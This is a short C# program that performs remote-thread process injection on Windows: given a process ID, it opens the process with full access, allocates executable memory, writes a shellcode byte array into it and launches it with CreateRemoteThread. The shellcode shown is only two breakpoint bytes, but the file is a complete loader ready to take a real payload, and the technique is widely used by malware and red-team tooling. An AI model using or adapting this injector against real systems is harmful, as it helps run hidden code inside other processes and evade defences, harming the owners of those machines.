using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace crt
{
    class Program
    {

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess,  IntPtr lpBaseAddress, byte[] lpBuffer,  Int32 nSize,  out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,   IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();
        static void Main(string[] args)
        {
            int PID = Convert.ToInt32(args[0]);
            byte[] shellcode = { 0xcc, 0xcc };
            uint PROCESS_ALL_ACCESS = 0x1f0fff;
            uint MEM_COMMIT = 0x00001000;
            uint PAGE_EXECUTE_READWRITE = 0x40;
            IntPtr written;
            IntPtr threadId;

            IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, true, PID);
            Console.WriteLine("HANDLE {0}", hProc);

            IntPtr mem = VirtualAllocEx(hProc, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Console.WriteLine("mem 0x{0}", mem.ToString("X"));

            WriteProcessMemory(hProc, mem, shellcode, shellcode.Length, out written);
            Console.WriteLine("written 0x{0} bytes", written.ToString("X"));

            CreateRemoteThread(hProc, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out threadId);
            Console.WriteLine("GetLastError {0}", GetLastError());
            Console.WriteLine("thread ID {0}\n", threadId);

            CloseHandle(hProc);

        }
    }
}

